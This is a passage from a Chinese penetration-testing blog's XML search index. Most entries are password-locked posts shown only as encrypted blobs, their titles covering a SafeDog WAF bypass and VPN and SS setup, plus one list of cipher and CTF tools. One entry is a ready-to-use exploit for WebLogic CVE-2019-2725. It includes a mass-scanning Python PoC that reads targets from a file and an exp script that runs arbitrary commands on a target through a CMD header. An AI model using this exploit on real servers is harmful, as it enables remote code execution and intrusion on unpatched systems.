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]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
        <category>奇淫技巧</category>
        <category>Waf特性</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[WAF之安全狗绕过方法]]></title>
    <url>%2Farchives%2Fd405928.html</url>
    <content type="text"><![CDATA[Please enter the password to read the blog. Incorrect Password! No content to display! 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]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
        <category>奇淫技巧</category>
        <category>Waf特性</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Weblogic反序列化远程代码执行漏洞exp(CVE-2019-2725)]]></title>
    <url>%2Farchives%2F4a706105.html</url>
    <content type="text"><![CDATA[利用点是weblogic的xmldecoder反序列化漏洞，只是构造巧妙的利用链对Oracle官方历年来对这个漏洞点的补丁绕过主要来还是懒 废话不多说直接上exp和poc 吧 poc并不通用 更多用exp吧 IP填入ip.txt 后用poc检测 POCimport requests import sys import time import random import threading def exec_cmd(ip,cmd): url=&quot;http://&quot;+ip+&quot;/wls-wsat/CoordinatorPortType11&quot; headers={ &apos;User-Agent&apos;: &apos;Apache-HttpClient/4.1.1 (java 1.5)&apos;, &apos;CMD&apos; : cmd, &apos;SOAPAction&apos;:&apos;&quot;&quot;&apos;, &apos;Content-Type&apos;:&apos;text/xml&apos; } with open(&apos;payload.txt&apos;,&apos;rb&apos;) as f : payloads=f.read() r=requests.post(url,headers=headers,data=payloads,timeout=5) return r.content.decode() def test_poc(ip): check=str(int(time.time())+int(random.uniform(1000,9999))) out=exec_cmd(ip,&apos;echo &apos;+check) if check in out: print(&apos;vul finds:&apos;+ip) def main(): print(&quot;put ips in ip.txt &quot;) with open(&apos;ip.txt&apos;) as f: for line in f.readlines(): try: test_poc(line) except : pass print(&quot;End&quot;) if __name__ == &apos;__main__&apos;: main()expimport requests import sys def exec_cmd(ip,cmd): url=&quot;http://&quot;+ip+&quot;/wls-wsat/CoordinatorPortType11&quot; headers={ &apos;User-Agent&apos;: &apos;Apache-HttpClient/4.1.1 (java 1.5)&apos;, &apos;CMD&apos; : cmd, &apos;SOAPAction&apos;:&apos;&quot;&quot;&apos;, &apos;Content-Type&apos;:&apos;text/xml&apos; } with open(&apos;payload.txt&apos;,&apos;rb&apos;) as f : payloads=f.read() r=requests.post(url,headers=headers,data=payloads) return r.content.decode() def main(): if len(sys.argv)&lt;3: print(&apos;usage:exp.py www.0dayhack.com:8080 whoami&apos;) sys.exit() ip=sys.argv[1] cmd=sys.argv[2] out=exec_cmd(ip,cmd) print(out) if __name__ == &apos;__main__&apos;: main() 注意:只支持Py3ip.txt是放检测的]]></content>
      <categories>
        <category>渗透测试</category>
        <category>漏洞挖掘</category>
        <category>常见漏洞</category>
        <category>中间件</category>
        <category>WebLogic</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[常见古典密码及在线工具]]></title>
    <url>%2Farchives%2Faa15bbdb.html</url>
    <content type="text"><![CDATA[常见古典密码及在线工具 加密解密二维码解码 二维码编码 Base64编码/解码 Base32/Base16 URL解码 MD5查询 摩尔斯电码 字符串处理 与佛论禅 将文本加密为各种语言 UU编码(邮件编码的一种) MIME标准(邮件编码的一种) Binhex编码(邮件编码的一种,常见于MAC机) 在线工具集合 栅栏密码 serpent加密解密 凯撒密码 js代码在线加密解密 词频在线分析 图像分析GIF逐帧分解 本地工具信隐术Stegsolve (图像通道分析工具) PngCheck (png图像区块分析工具) OutGuess隐写工具 (图像隐写工具OutGuess) JHide隐写工具 (JHide图片隐写工具) PDF隐写工具 (PDF隐写工具) WaveEditor (音频波形编辑工具) Sonicvisualiser (音频频谱分析工具) 反编译IDAQ (反编译工具) 破解 ARPR (压缩文件破解工具) Base64编码解码器(Base64编码解码器) F5算法(隐写) 文件文件头 编码ASCII 摩尔斯电码 培根密码 APIPHP API 工具集： 密码机器（强烈推荐）包含了：栅栏密码 ，凯撒密码，维吉尼亚密码，摩斯电码，MD5 ，置换密码，替代密码 等。 常见密码：base64 ascii与十六进制、十进制、二进制转换 url解密 编码：JavaScript之jsfuck 在线解码或在浏览器F12的调试器中执行 brainfuck]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
        <category>奇淫技巧</category>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Linux_一键搭建VPN]]></title>
    <url>%2Farchives%2Fb18c4253.html</url>
    <content type="text"><![CDATA[Please enter the password to read the blog. Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>渗透测试</category>
        <category>后渗透</category>
        <category>内网渗透</category>
        <category>内网通道</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Linux一键搭建SS]]></title>
    <url>%2Farchives%2F23c2d7c0.html</url>
    <content type="text"><![CDATA[Please enter the password to read the blog. Incorrect Password! No content to display! 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